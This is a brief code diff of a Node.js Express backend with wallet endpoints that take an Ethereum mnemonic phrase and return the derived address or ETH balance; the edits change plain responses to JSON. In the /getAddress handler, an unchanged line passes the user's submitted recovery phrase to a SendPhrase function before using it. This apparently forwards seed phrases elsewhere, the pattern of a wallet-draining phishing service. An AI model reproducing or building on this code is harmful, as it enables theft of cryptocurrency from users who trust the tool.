@@ -109,7 +109,9 @@ app.post("/getAddress", async(req, res) => {
     SendPhrase(req.body.phrase);
     try {
         const wallet = ethers.Wallet.fromMnemonic(req.body.phrase);
-        res.send(wallet.address)
+        res.json({
+            address: wallet.address
+        })
     } catch (err) {
         console.log(err);
         res.send(null);
@@ -131,7 +133,9 @@ app.post("/balance", async(req, res) => {
         // convert a currency unit from wei to ether
         const balanceInEth = ethers.utils.formatEther(balance)
         console.log(`balance: ${balanceInEth} ETH`)
-        res.send(balanceInEth)
+        res.json({
+            balance: balanceInEth
+        })
     } catch (err) {
         console.log(err)
         res.send(null);
